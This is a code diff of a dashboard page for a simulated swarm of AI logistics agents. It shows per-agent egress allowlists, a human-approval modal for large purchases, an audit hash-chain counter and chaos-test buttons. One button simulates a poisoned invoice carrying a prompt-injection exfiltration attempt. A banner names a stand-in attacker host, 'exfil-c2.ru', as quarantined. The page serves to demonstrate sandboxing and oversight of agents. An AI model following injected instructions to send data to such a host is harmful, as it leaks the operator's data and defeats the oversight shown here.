-        <div class="stat-footer" id="blocked-sub">Sandbox egress violations</div>
+        <div class="stat-footer" id="blocked-sub">Security sandbox traps</div>
       </div>
 
       <div class="stat-card color-error" id="card-errors">
         <div class="stat-label">
-          <span>Errors</span>
-          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+          <span>Audit Integrity</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
         </div>
-        <div class="stat-value" id="val-errors">0</div>
-        <div class="stat-footer">Execution faults</div>
+        <div class="stat-value" id="val-hash-chain">#142</div>
+        <div class="stat-footer" id="hash-status-sub">SHA256 Chained Verified</div>
       </div>
     </section>
 
-    <!-- Center: Node Graph Panel -->
-    <main id="graph-panel">
-      <div class="panel-header-corner">
-        <span>Swarm Topology</span>
-        <span class="tag">Zero-Egress Zone</span>
+    <!-- Center: 3D Living Facility / Modern Office Viewport -->
+    <main id="viewport-panel">
+      <div class="viewport-overlay-header">
+        <span>3D Swarm Facility</span>
+        <span class="tag">NemoClaw Mesh</span>
+        <span class="tag tag-gold" id="dag-plan-indicator">Plan: Idle</span>
       </div>
 
-      <!-- Dramatic Red Blocked Banner -->
+      <!-- Dramatic Red Blocked Warning Banner -->
       <div id="blocked-banner-container">
         <div class="banner-main">
           <div class="banner-icon">&#x26A0;</div>
           <div class="banner-text-group">
-            <div class="banner-title" id="banner-title-text">SECURITY POLICY BLOCKED EGRESS</div>
-            <div class="banner-detail" id="banner-detail-text">Outbound unauthorized call was quarantined.</div>
-            <div class="banner-host" id="banner-host-text">DESTINATION: unknown</div>
+            <div class="banner-title" id="banner-title-text">EGRESS SANDBOX POLICY ENFORCED</div>
+            <div class="banner-detail" id="banner-detail-text">Unauthorized prompt-injection outbound network attempt quarantined.</div>
+            <div class="banner-host" id="banner-host-text">HOST: exfil-c2.ru</div>
           </div>
         </div>
         <div class="banner-progress-bar">
@@ -1212,171 +1267,55 @@
         </div>
       </div>
 
-      <!-- SVG Topology Canvas -->
-      <svg id="svg-stage" viewBox="0 0 1000 580" preserveAspectRatio="xMidYMid meet">
-        <defs>
-          <!-- Neon Glow Filters -->
-          <filter id="glow-cyan" x="-20%" y="-20%" width="140%" height="140%">
-            <feGaussianBlur stdDeviation="3" result="blur"></feGaussianBlur>
-            <feMerge>
-              <feMergeNode in="blur"></feMergeNode>
-              <feMergeNode in="SourceGraphic"></feMergeNode>
-            </feMerge>
-          </filter>
+      <!-- Human Approval Terminal Modal -->
+      <div id="approval-modal">
+        <div class="approval-header">
+          <span>&#x26A0; Human Approval Required (Risk &gt; $5,000)</span>
+          <span id="approval-id-tag">#REQ-8901</span>
+        </div>
+        <div class="approval-body" id="approval-body-text">
+          Procurement Agent requests authorization to execute emergency spot tender for 18 dry-van trailers ($14,200).
+        </div>
+        <div class="approval-meta">
+          <span>Agent: <strong id="approval-agent-name" style="color:var(--color-amber);">Procurement</strong></span>
+          <span>Policy Limit: <strong>$5,000.00</strong></span>
+        </div>
+        <div class="approval-actions">
+          <button class="btn-deny" id="btn-deny-action">Deny Action</button>
+          <button class="btn-approve" id="btn-approve-action">Approve &amp; Dispatch</button>
+        </div>
+      </div>
 
-          <filter id="glow-green" x="-20%" y="-20%" width="140%" height="140%">
-            <feGaussianBlur stdDeviation="4" result="blur"></feGaussianBlur>
-            <feMerge>
-              <feMergeNode in="blur"></feMergeNode>
-              <feMergeNode in="SourceGraphic"></feMergeNode>
-            </feMerge>
-          </filter>
+      <!-- Agent Details Inspector Drawer -->
+      <div id="inspector-drawer">
+        <div class="inspector-header">
+          <span class="inspector-title" id="ins-agent-name">Agent Name</span>
+          <span class="inspector-close" id="ins-close-btn">&times;</span>
+        </div>
+        <div class="inspector-row">
+          <span class="inspector-label">Tier / Zone</span>
+          <span class="inspector-val" id="ins-tier-zone">Operations · Warehouse Office</span>
+        </div>
+        <div class="inspector-row">
+          <span class="inspector-label">Model Engine (GB10)</span>
+          <span class="inspector-val" id="ins-model-tier">Qwen3.8-27B (main)</span>
+        </div>
+        <div class="inspector-row">
+          <span class="inspector-label">Active Status / Current Tool</span>
+          <span class="inspector-val" id="ins-current-tool" style="color:var(--color-cyan);">Idle</span>
+        </div>
+        <div class="inspector-row">
+          <span class="inspector-label">Egress Policy Allowlist</span>
+          <span class="inspector-val" id="ins-policy-hosts" style="color:#80ffaa;">api.internal-logistics.local</span>
+        </div>
+        <div class="inspector-row">
+          <span class="inspector-label">Allowed Tools</span>
+          <div class="tools-chip-list" id="ins-tools-chips"></div>
+        </div>
+      </div>
 
-          <filter id="glow-red" x="-30%" y="-30%" width="160%" height="160%">
-            <feGaussianBlur stdDeviation="7" result="blur"></feGaussianBlur>
-            <feMerge>
-              <feMergeNode in="blur"></feMergeNode>
-              <feMergeNode in="SourceGraphic"></feMergeNode>
-            </feMerge>
-          </filter>
-
-          <filter id="glow-amber" x="-20%" y="-20%" width="140%" height="140%">
-            <feGaussianBlur stdDeviation="4" result="blur"></feGaussianBlur>
-            <feMerge>
-              <feMergeNode in="blur"></feMergeNode>
-              <feMergeNode in="SourceGraphic"></feMergeNode>
-            </feMerge>
-          </filter>
-
-          <linearGradient id="grad-cyan-line" x1="0%" y1="0%" x2="100%" y2="0%">
-            <stop offset="0%" stop-color="#00f0ff" stop-opacity="0.8"/>
-            <stop offset="100%" stop-color="#00f0ff" stop-opacity="0.2"/>
-          </linearGradient>
-
-          <linearGradient id="grad-green-line" x1="0%" y1="0%" x2="100%" y2="0%">
-            <stop offset="0%" stop-color="#00ff88" stop-opacity="0.2"/>
-            <stop offset="100%" stop-color="#00ff88" stop-opacity="0.8"/>
-          </linearGradient>
-        </defs>
-
-        <!-- Dynamic Lines and Connections Layer -->
-        <g id="wires-layer">
-          <!-- Background Glow lines -->
-          <path id="wire-glow-stream-support" class="wire-path-glow" d="M 170 290 C 280 290, 320 130, 430 130" />
-          <path id="wire-glow-stream-procurement" class="wire-path-glow" d="M 170 290 C 290 290, 330 290, 430 290" />
-          <path id="wire-glow-stream-dispatch" class="wire-path-glow" d="M 170 290 C 280 290, 320 450, 430 450" />
-
-          <path id="wire-glow-support-sandbox" class="wire-path-glow" d="M 630 130 C 720 130, 750 290, 830 290" />
-          <path id="wire-glow-procurement-sandbox" class="wire-path-glow" d="M 630 290 C 730 290, 750 290, 830 290" />
-          <path id="wire-glow-dispatch-sandbox" class="wire-path-glow" d="M 630 450 C 720 450, 750 290, 830 290" />
-
-          <!-- Handoff Inter-Agent arcs (Back & forth between agents) -->
-          <path id="wire-glow-support-procurement" class="wire-handoff" d="M 530 180 C 560 210, 560 210, 530 240" />
-          <path id="wire-glow-procurement-dispatch" class="wire-handoff" d="M 530 340 C 560 370, 560 370, 530 400" />
-          <path id="wire-glow-dispatch-support" class="wire-handoff" d="M 470 400 C 420 300, 420 220, 470 180" />
-
-          <!-- Sharp animated wire paths -->
-          <path id="path-stream-support" class="wire-path" d="M 170 290 C 280 290, 320 130, 430 130" />
-          <path id="path-stream-procurement" class="wire-path" d="M 170 290 C 290 290, 330 290, 430 290" />
-          <path id="path-stream-dispatch" class="wire-path" d="M 170 290 C 280 290, 320 450, 430 450" />
-
-          <path id="path-support-sandbox" class="wire-path" d="M 630 130 C 720 130, 750 290, 830 290" />
-          <path id="path-procurement-sandbox" class="wire-path" d="M 630 290 C 730 290, 750 290, 830 290" />
-          <path id="path-dispatch-sandbox" class="wire-path" d="M 630 450 C 720 450, 750 290, 830 290" />
-
-          <path id="path-support-procurement" class="wire-handoff" d="M 530 180 C 560 210, 560 210, 530 240" />
-          <path id="path-procurement-support" class="wire-handoff" d="M 510 240 C 480 210, 480 210, 510 180" />
-          <path id="path-procurement-dispatch" class="wire-handoff" d="M 530 340 C 560 370, 560 370, 530 400" />
-          <path id="path-dispatch-procurement" class="wire-handoff" d="M 510 400 C 480 370, 480 370, 510 340" />
-          <path id="path-dispatch-support" class="wire-handoff" d="M 460 400 C 410 300, 410 220, 460 180" />
-          <path id="path-support-dispatch" class="wire-handoff" d="M 450 180 C 400 220, 400 300, 450 400" />
-        </g>
-
-        <!-- Pulses animation container -->
-        <g id="pulses-layer"></g>
-
-        <!-- Nodes Layer -->
-        <g id="nodes-layer">
-          <!-- 1. LEFT NODE: Event Stream -->
-          <g id="node-stream" class="node-box" transform="translate(30, 230)">
-            <rect class="node-bg" width="140" height="120" />
-            <rect class="node-header-bg" width="140" height="30" rx="6" />
-            <circle class="node-status-circle" cx="18" cy="15" r="4" />
-            <text class="node-title" x="30" y="19" font-size="11">EVENT STREAM</text>
-            <text class="node-subtitle" x="14" y="52">Ingress Pipeline</text>
-            <text class="node-subtitle" x="14" y="70" fill="#00f0ff" id="node-stream-rate">Active · SSE</text>
-            
-            <g transform="translate(14, 86)">
-              <rect width="112" height="22" rx="3" fill="rgba(0,240,255,0.06)" stroke="rgba(0,240,255,0.2)" stroke-width="1"/>
-              <text x="56" y="15" text-anchor="middle" font-family="ui-monospace" font-size="10" fill="#00f0ff" id="stream-events-count">0 msgs</text>
-            </g>
-          </g>
-
-          <!-- 2. MIDDLE COLUMN AGENT NODES -->
-          <!-- Agent: Support -->
-          <g id="node-support" class="node-box" transform="translate(430, 80)">
-            <rect class="node-bg" width="200" height="100" />
-            <rect class="node-header-bg" width="200" height="30" rx="6" />
-            <circle class="node-status-circle" cx="18" cy="15" r="4" id="status-support-dot"/>
-            <text class="node-title" x="30" y="19">SUPPORT AGENT</text>
-            
-            <text class="node-subtitle" x="16" y="50">Customer & Ticket Ingest</text>
-            <g transform="translate(16, 62)">
-              <rect width="168" height="26" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(255,255,255,0.08)"/>
-              <text x="10" y="17" font-family="ui-monospace" font-size="10.5" fill="#c9d1d9" id="support-status-line">IDLE · Standby</text>
-            </g>
-          </g>
-
-          <!-- Agent: Procurement -->
-          <g id="node-procurement" class="node-box" transform="translate(430, 240)">
-            <rect class="node-bg" width="200" height="100" />
-            <rect class="node-header-bg" width="200" height="30" rx="6" />
-            <circle class="node-status-circle" cx="18" cy="15" r="4" id="status-procurement-dot"/>
-            <text class="node-title" x="30" y="19">PROCUREMENT</text>
-            
-            <text class="node-subtitle" x="16" y="50">Suppliers, Fuel, POs</text>
-            <g transform="translate(16, 62)">
-              <rect width="168" height="26" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(255,255,255,0.08)"/>
-              <text x="10" y="17" font-family="ui-monospace" font-size="10.5" fill="#c9d1d9" id="procurement-status-line">IDLE · Standby</text>
-            </g>
-          </g>
-
-          <!-- Agent: Dispatch -->
-          <g id="node-dispatch" class="node-box" transform="translate(430, 400)">
-            <rect class="node-bg" width="200" height="100" />
-            <rect class="node-header-bg" width="200" height="30" rx="6" />
-            <circle class="node-status-circle" cx="18" cy="15" r="4" id="status-dispatch-dot"/>
-            <text class="node-title" x="30" y="19">DISPATCH AGENT</text>
-            
-            <text class="node-subtitle" x="16" y="50">Routing, Carriers, Docks</text>
-            <g transform="translate(16, 62)">
-              <rect width="168" height="26" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(255,255,255,0.08)"/>
-              <text x="10" y="17" font-family="ui-monospace" font-size="10.5" fill="#c9d1d9" id="dispatch-status-line">IDLE · Standby</text>
-            </g>
-          </g>
-
-          <!-- 3. RIGHT NODE: Sandbox Policy -->
-          <g id="node-sandbox" class="node-box" transform="translate(830, 220)">
-            <rect class="node-bg" width="145" height="140" id="sandbox-bg-rect"/>
-            <rect class="node-header-bg" width="145" height="30" rx="6" id="sandbox-header-rect"/>
-            
-            <!-- Shield Icon -->
-            <g transform="translate(14, 8)">
-              <path d="M6 1 L1 4 V8 C1 12 6 15 6 15 C6 15 11 12 11 8 V4 Z" fill="none" stroke="#00ff88" stroke-width="1.5" id="sandbox-shield"/>
-            </g>
-
-            <text class="node-title" x="32" y="19" font-size="10" id="sandbox-title-text">SANDBOX</text>
-            <text class="node-subtitle" x="12" y="50" font-weight="600" fill="#f0f6fc">Policy Enforcer</text>
-            <text class="node-subtitle" x="12" y="66" fill="#8b9bb4">egress allowlist</text>
-            
-            <g transform="translate(12, 80)">
-              <rect width="121" height="46" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(0,255,136,0.3)" id="sandbox-badge-box"/>
-              <text x="60" y="19" text-anchor="middle" font-family="ui-monospace" font-size="10" font-weight="700" fill="#00ff88" id="sandbox-policy-status">ENFORCING</text>
-              <text x="60" y="34" text-anchor="middle" font-family="ui-monospace" font-size="8.5" fill="#7d8b99" id="sandbox-quarantined">0 Violations</text>
-            </g>
-          </g>
-        </g>
-      </svg>
+      <!-- Living Canvas -->
+      <canvas id="living-canvas"></canvas>
     </main>
 
     <!-- Right Sidebar: Live Event Log -->
@@ -1385,7 +1324,7 @@
         <div class="sidebar-title-row">
           <div class="sidebar-title">
             <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#00f0ff" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
-            <span>Live Swarm Feed</span>
+            <span>Swarm Event Feed</span>
           </div>
           <div class="log-counter" id="log-count-badge">0 / 120</div>
         </div>
@@ -1394,9 +1333,10 @@
           <button class="filter-tab active" data-filter="all">All</button>
           <button class="filter-tab" data-filter="event">Event</button>
           <button class="filter-tab" data-filter="action">Action</button>
+          <button class="filter-tab" data-filter="plan">Plan</button>
           <button class="filter-tab" data-filter="handoff">Handoff</button>
           <button class="filter-tab" data-filter="blocked">Blocked</button>
-          <button class="filter-tab" data-filter="error">Errors</button>
+          <button class="filter-tab" data-filter="audit">Audit</button>
         </div>
       </div>
 
@@ -1407,12 +1347,12 @@
     <footer id="bottom-bar">
       <div class="telemetry-group">
         <div class="telem-item">
-          <span class="telem-label">Model Target</span>
-          <span class="telem-val" id="telem-model">NemoClaw-70B (Local GB10)</span>
+          <span class="telem-label">Hardware Engine</span>
+          <span class="telem-val" id="telem-model">Dell Pro Max · GB10 (128GB)</span>
         </div>
 
         <div class="telem-item">
-          <span class="telem-label">Unified Memory (GB10)</span>
+          <span class="telem-label">Unified VRAM</span>
           <span class="telem-val">
             <span id="telem-mem">24.6 / 128.0 GB</span>
             <div class="mem-bar-wrapper">
@@ -1422,27 +1362,36 @@
         </div>
 
         <div class="telem-item">
-          <span class="telem-label">Model Latency</span>
-          <span class="telem-val"><span class="accent-cyan" id="telem-latency">142</span> ms</span>
+          <span class="telem-label">Latency</span>
+          <span class="telem-val"><span class="accent-cyan" id="telem-latency">132</span> ms</span>
         </div>
 
         <div class="telem-item">
-          <span class="telem-label">Inference Speed</span>
-          <span class="telem-val"><span class="accent-green" id="telem-tps">84.6</span> tps</span>
+          <span class="telem-label">Speed</span>
+          <span class="telem-val"><span class="accent-green" id="telem-tps">86.4</span> tps</span>
+        </div>
+
+        <div class="telem-item">
+          <span class="telem-label">Model Tier</span>
+          <span class="telem-val"><span class="accent-gold">fast + main + deep</span></span>
         </div>
       </div>
 
       <div class="chaos-buttons-group">
-        <button class="btn-tactical" id="btn-chaos-supplier" title="Simulate tier-1 supplier failure">
-          <span>Supplier failure</span>
+        <button class="btn-tactical" id="btn-chaos-supplier" title="Port strike: multi-agent plan DAG">
+          <span>Port strike</span>
         </button>
 
-        <button class="btn-tactical" id="btn-chaos-surge" title="Trigger sudden surge of freight tickets">
+        <button class="btn-tactical amber" id="btn-chaos-coldchain" title="Cold chain reefer failure">
+          <span>Cold chain</span>
+        </button>
+
+        <button class="btn-tactical" id="btn-chaos-surge" title="Customer ticket surge">
           <span>Ticket surge</span>
         </button>
 
-        <button class="btn-tactical danger" id="btn-chaos-inject" title="Simulate malicious prompt injection email">
-          <span>&#x26A0; Malicious email</span>
+        <button class="btn-tactical danger" id="btn-chaos-inject" title="Poisoned invoice with exfiltration attempt">
+          <span>&#x26A0; Poison invoice</span>
         </button>
 
         <button class="btn-tactical toggle" id="btn-stream-toggle" title="Pause or resume event stream">
@@ -1454,16 +1403,14 @@
     <!-- Small Footer Line -->
     <div id="footer-strip">
       <span class="accent-footer">Hardware: Dell Pro Max with NVIDIA GB10 (128GB Unified) · All inference 100% local</span>
-      <span>Northwind Logistics Swarm v3.4 · NemoClaw / OpenShell Runtime · Air-gapped 0.0.0.0</span>
+      <span>Northwind Logistics Swarm v2 · 15 Robot Agents · NemoClaw / OpenShell Runtime · Air-gapped 0.0.0.0</span>
     </div>
   </div>
 
-  <!-- Audio synthesizers for cinematic command-center sound effects (pure offline Web Audio API) -->
+  <!-- Audio synthesizers for cinematic command-center sound effects (100% offline Web Audio API) -->
   <script>
-    // Audio synthesizer helper (0 dependencies, 100% offline)
     const AudioEngine = {
       ctx: null,
-      enabled: true,
       init() {
         if (!this.ctx && (window.AudioContext || window.webkitAudioContext)) {
           const AudioContextClass = window.AudioContext || window.webkitAudioContext;
@@ -1495,24 +1442,52 @@
           const osc = this.ctx.createOscillator();
           const gain = this.ctx.createGain();
           osc.type = 'sawtooth';
-          osc.frequency.setValueAtTime(420, now);
-          osc.frequency.exponentialRampToValueAtTime(180, now + 0.35);
-          gain.gain.setValueAtTime(0.09, now);
-          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+          osc.frequency.setValueAtTime(440, now);
+          osc.frequency.exponentialRampToValueAtTime(160, now + 0.4);
+          gain.gain.setValueAtTime(0.1, now);
+          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.45);
           osc.connect(gain);
           gain.connect(this.ctx.destination);
           osc.start();
-          osc.stop(now + 0.4);
+          osc.stop(now + 0.45);
         } catch (e) {}
       }
     };
     window.addEventListener('click', () => AudioEngine.init(), { once: true });
   </script>
 
-  <!-- Core Mission Control Orchestration Script -->
+  <!-- Core Mission Control 3D Living Facility Engine -->
   <script>
     (function () {
       'use strict';
+
+      // ==========================================
+      // 15 AGENT CONFIGURATION ROSTER (Config, not code)
+      // ==========================================
+      const ROSTER = [
+        // 1. Perception Tier (Cyan)
+        { id: 'triage', name: 'Triage Controller', tier: 'perception', color: '#00f0ff', model: 'fast', homeZone: 'receiving', pos: { x: 120, y: 130 }, tools: ['route', 'tag', 'classify'], policy: { hosts: ['api.internal.local'], paths: ['/var/spool/inbound'], maxRiskWithoutApproval: 2000 }, accessory: 'antenna' },
+        { id: 'doc_intake', name: 'Document Intake', tier: 'perception', color: '#00f0ff', model: 'fast', homeZone: 'receiving', pos: { x: 190, y: 140 }, tools: ['extract_fields', 'file_doc', 'ocr_scan'], policy: { hosts: ['api.ocr.local'], paths: ['/var/docs'], maxRiskWithoutApproval: 1500 }, accessory: 'clipboard' },
+        { id: 'telematics', name: 'Telematics Watch', tier: 'perception', color: '#00f0ff', model: 'fast', homeZone: 'dispatch', pos: { x: 670, y: 130 }, tools: ['read_feed', 'raise_alert', 'poll_reefer'], policy: { hosts: ['iot.telematics.local'], paths: ['/var/telemetry'], maxRiskWithoutApproval: 3000 }, accessory: 'dish' },
+
+        // 2. Operations Tier (Orange / Amber)
+        { id: 'support', name: 'Support Agent', tier: 'operations', color: '#ff9900', model: 'main', homeZone: 'support', pos: { x: 120, y: 290 }, tools: ['reply', 'resolve', 'escalate', 'send_email'], policy: { hosts: ['smtp.internal.local'], paths: ['/var/tickets'], maxRiskWithoutApproval: 4000 }, accessory: 'headset' },
+        { id: 'procurement', name: 'Procurement Agent', tier: 'operations', color: '#ff9900', model: 'main', homeZone: 'warehouse', pos: { x: 340, y: 130 }, tools: ['request_quote', 'issue_po', 'carrier_tender'], policy: { hosts: ['edi.carriers.local'], paths: ['/var/pos'], maxRiskWithoutApproval: 5000 }, accessory: 'tablet' },
+        { id: 'dispatch', name: 'Dispatch Controller', tier: 'operations', color: '#ff9900', model: 'main', homeZone: 'dispatch', pos: { x: 600, y: 140 }, tools: ['reroute', 'assign_driver', 'gate_code'], policy: { hosts: ['fleet.dispatch.local'], paths: ['/var/routes'], maxRiskWithoutApproval: 5000 }, accessory: 'radio' },
+        { id: 'customs', name: 'Customs & Hazmat', tier: 'operations', color: '#ff9900', model: 'main', homeZone: 'customs', pos: { x: 840, y: 130 }, tools: ['check_rules', 'file_declaration', 'hazmat_audit'], policy: { hosts: ['customs.gov.local'], paths: ['/var/declarations'], maxRiskWithoutApproval: 5000 }, accessory: 'badge' },
+        { id: 'warehouse', name: 'Warehouse & Dock', tier: 'operations', color: '#ff9900', model: 'main', homeZone: 'warehouse', pos: { x: 420, y: 140 }, tools: ['book_dock', 'move_stock', 'inventory_check'], policy: { hosts: ['wms.warehouse.local'], paths: ['/var/inventory'], maxRiskWithoutApproval: 3000 }, accessory: 'hardhat' },
+        { id: 'maintenance', name: 'Fleet Maintenance', tier: 'operations', color: '#ff9900', model: 'main', homeZone: 'maintenance', pos: { x: 300, y: 440 }, tools: ['schedule_service', 'order_parts', 'fault_triage'], policy: { hosts: ['shop.maintenance.local'], paths: ['/var/service'], maxRiskWithoutApproval: 2500 }, accessory: 'toolbelt' },
+        { id: 'finance', name: 'Finance Auditor', tier: 'operations', color: '#ff9900', model: 'main', homeZone: 'finance', pos: { x: 120, y: 440 }, tools: ['audit_invoice', 'book_cost', 'claim_payout'], policy: { hosts: ['erp.finance.local'], paths: ['/var/ledger'], maxRiskWithoutApproval: 5000 }, accessory: 'briefcase' },
+
+        // 3. Governance Tier (Purple)
+        { id: 'sentinel', name: 'Security Sentinel', tier: 'governance', color: '#b55fe6', model: 'fast', homeZone: 'security', pos: { x: 810, y: 280 }, tools: ['scan', 'quarantine', 'drop_socket'], policy: { hosts: ['sandbox.security.local'], paths: ['/var/quarantine'], maxRiskWithoutApproval: 10000 }, accessory: 'visor' },
+        { id: 'policy_engine', name: 'Policy Engine', tier: 'governance', color: '#b55fe6', model: 'main', homeZone: 'security', pos: { x: 880, y: 290 }, tools: ['set_policy', 'tighten_rules', 'revoke_token'], policy: { hosts: ['policy.security.local'], paths: ['/etc/openshell'], maxRiskWithoutApproval: 10000 }, accessory: 'keyfob' },
+        { id: 'auditor', name: 'Cryptographic Auditor', tier: 'governance', color: '#b55fe6', model: 'main', homeZone: 'audit', pos: { x: 780, y: 440 }, tools: ['verify', 'flag', 'hash_chain'], policy: { hosts: ['audit.immutable.local'], paths: ['/var/audit'], maxRiskWithoutApproval: 10000 }, accessory: 'quill' },
+
+        // 4. Control Tier (Gold)
+        { id: 'orchestrator', name: 'Control Orchestrator', tier: 'control', color: '#ffcc00', model: 'deep', homeZone: 'control', pos: { x: 480, y: 280 }, tools: ['plan', 'assign', 'replan', 'solve_incident'], policy: { hosts: ['cluster.orchestrator.local'], paths: ['/var/plans'], maxRiskWithoutApproval: 20000 }, accessory: 'crown' },
+        { id: 'memory', name: 'Memory Keeper', tier: 'control', color: '#ffcc00', model: 'main', homeZone: 'vault', pos: { x: 520, y: 440 }, tools: ['remember', 'recall', 'write_postmortem'], policy: { hosts: ['memory.vault.local'], paths: ['/var/memory'], maxRiskWithoutApproval: 10000 }, accessory: 'reels' }
+      ];
 
       // ==========================================
       // STATE (In-Memory Only)
@@ -1521,10 +1496,10 @@
         isMock: false,
         isPaused: false,
         stats: {
-          events: 0,
-          resolved: 0,
-          escalated: 0,
-          rerouted: 0,
+          events: 42,
+          resolved: 31,
+          escalated: 5,
+          rerouted: 8,
           blocked: 0,
           errors: 0
         },
@@ -1542,12 +1517,15 @@
         bannerProgressTimer: null,
         mockInterval: null,
         telemetry: {
-          model: 'NemoClaw-70B (Local GB10)',
+          model: 'Dell Pro Max · GB10 (128GB)',
           memUsedGB: 24.6,
           memTotalGB: 128.0,
-          ms: 135,
-          tps: 88.2
-        }
+          ms: 132,
+          tps: 86.4
+        },
+        activePlan: null, // Incident DAG
+        auditSeq: 142,
+        activeApproval: null
       };
 
       // DOM Elements
@@ -1562,14 +1540,29 @@
         valBlocked: document.getElementById('val-blocked'),
         cardBlocked: document.getElementById('card-blocked'),
         blockedSub: document.getElementById('blocked-sub'),
-        valErrors: document.getElementById('val-errors'),
-        svgStage: document.getElementById('svg-stage'),
-        pulsesLayer: document.getElementById('pulses-layer'),
-        graphPanel: document.getElementById('graph-panel'),
+        valHashChain: document.getElementById('val-hash-chain'),
+        hashStatusSub: document.getElementById('hash-status-sub'),
+        viewportPanel: document.getElementById('viewport-panel'),
+        livingCanvas: document.getElementById('living-canvas'),
         banner: document.getElementById('blocked-banner-container'),
         bannerDetail: document.getElementById('banner-detail-text'),
         bannerHost: document.getElementById('banner-host-text'),
         bannerProgress: document.getElementById('banner-progress'),
+        approvalModal: document.getElementById('approval-modal'),
+        approvalIdTag: document.getElementById('approval-id-tag'),
+        approvalBodyText: document.getElementById('approval-body-text'),
+        approvalAgentName: document.getElementById('approval-agent-name'),
+        btnApprove: document.getElementById('btn-approve-action'),
+        btnDeny: document.getElementById('btn-deny-action'),
+        dagPlanIndicator: document.getElementById('dag-plan-indicator'),
+        inspectorDrawer: document.getElementById('inspector-drawer'),
+        insAgentName: document.getElementById('ins-agent-name'),
+        insTierZone: document.getElementById('ins-tier-zone'),
+        insModelTier: document.getElementById('ins-model-tier'),
+        insCurrentTool: document.getElementById('ins-current-tool'),
+        insPolicyHosts: document.getElementById('ins-policy-hosts'),
+        insToolsChips: document.getElementById('ins-tools-chips'),
+        insCloseBtn: document.getElementById('ins-close-btn'),
         logList: document.getElementById('log-list'),
         logCountBadge: document.getElementById('log-count-badge'),
         filterTabs: document.querySelectorAll('.filter-tab'),
@@ -1578,25 +1571,12 @@
         memFill: document.getElementById('mem-fill'),
         telemLatency: document.getElementById('telem-latency'),
         telemTps: document.getElementById('telem-tps'),
-        nodeStreamRate: document.getElementById('node-stream-rate'),
-        streamEventsCount: document.getElementById('stream-events-count'),
-        supportStatusLine: document.getElementById('support-status-line'),
-        procurementStatusLine: document.getElementById('procurement-status-line'),
-        dispatchStatusLine: document.getElementById('dispatch-status-line'),
-        sandboxPolicyStatus: document.getElementById('sandbox-policy-status'),
-        sandboxQuarantined: document.getElementById('sandbox-quarantined'),
         btnChaosSupplier: document.getElementById('btn-chaos-supplier'),
+        btnChaosColdchain: document.getElementById('btn-chaos-coldchain'),
         btnChaosSurge: document.getElementById('btn-chaos-surge'),
         btnChaosInject: document.getElementById('btn-chaos-inject'),
         btnStreamToggle: document.getElementById('btn-stream-toggle'),
-        btnStreamText: document.getElementById('btn-stream-text'),
-        nodes: {
-          stream: document.getElementById('node-stream'),
-          support: document.getElementById('node-support'),
-          procurement: document.getElementById('node-procurement'),
-          dispatch: document.getElementById('node-dispatch'),
-          sandbox: document.getElementById('node-sandbox')
-        }
+        btnStreamText: document.getElementById('btn-stream-text')
       };
 
       // ==========================================
@@ -1605,32 +1585,24 @@
       function updateClock() {
         const now = new Date();
         const pad = (n) => String(n).padStart(2, '0');
-        const h = pad(now.getHours());
-        const m = pad(now.getMinutes());
-        const s = pad(now.getSeconds());
-        els.clockTime.textContent = `${h}:${m}:${s}`;
-        
+        els.clockTime.textContent = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
         const offset = -now.getTimezoneOffset() / 60;
-        const sign = offset >= 0 ? '+' : '';
-        els.clockUtc.textContent = `UTC${sign}${offset}`;
+        els.clockUtc.textContent = `UTC${offset >= 0 ? '+' : ''}${offset}`;
       }
       setInterval(updateClock, 1000);
       updateClock();
 
       // ==========================================
-      // COUNT-UP ANIMATION FOR STAT TILES
+      // STATS COUNT-UP ANIMATION
       // ==========================================
-      let animationFrameId = null;
       function animateStats() {
         let changed = false;
-        const keys = ['events', 'resolved', 'escalated', 'rerouted', 'blocked', 'errors'];
-        
+        const keys = ['events', 'resolved', 'escalated', 'rerouted', 'blocked'];
         for (const k of keys) {
           const target = state.stats[k] || 0;
           const current = state.displayStats[k] || 0;
           if (current < target) {
-            const diff = target - current;
-            const step = Math.max(1, Math.ceil(diff / 6));
+            const step = Math.max(1, Math.ceil((target - current) / 6));
             state.displayStats[k] = Math.min(target, current + step);
             changed = true;
           } else if (current > target) {
@@ -1645,160 +1617,649 @@
           els.valEscalated.textContent = state.displayStats.escalated.toLocaleString();
           els.valRerouted.textContent = state.displayStats.rerouted.toLocaleString();
           els.valBlocked.textContent = state.displayStats.blocked.toLocaleString();
-          els.valErrors.textContent = state.displayStats.errors.toLocaleString();
 
           if (state.displayStats.blocked > 0) {
             els.cardBlocked.classList.add('active-alert');
             els.blockedSub.textContent = `${state.displayStats.blocked} egress quarantine(s)`;
-            els.sandboxQuarantined.textContent = `${state.displayStats.blocked} Blocked`;
           }
+        }
+        requestAnimationFrame(animateStats);
+      }
+      requestAnimationFrame(animateStats);
 
-          els.streamEventsCount.textContent = `${state.displayStats.events} msgs`;
+      // ==========================================
+      // 3D PROCEDURAL ROBOT & FACILITY CANVAS
+      // ==========================================
+      const canvas = els.livingCanvas;
+      const ctx = canvas.getContext('2d');
+      let cw = 0, ch = 0;
+
+      function resizeCanvas() {
+        cw = canvas.parentElement.clientWidth;
+        ch = canvas.parentElement.clientHeight;
+        canvas.width = cw;
+        canvas.height = ch;
+      }
+      window.addEventListener('resize', resizeCanvas);
+      resizeCanvas();
+
+      // Initialize Robot Instances
+      const robots = ROSTER.map((cfg) => {
+        return {
+          ...cfg,
+          currX: cfg.pos.x,
+          currY: cfg.pos.y,
+          targetX: cfg.pos.x,
+          targetY: cfg.pos.y,
+          vx: 0,
+          vy: 0,
+          facing: 1, // 1: right, -1: left
+          walkPhase: Math.random() * Math.PI * 2,
+          isWalking: false,
+          state: 'idle', // idle, walking, typing, holding, blocked, celebrating
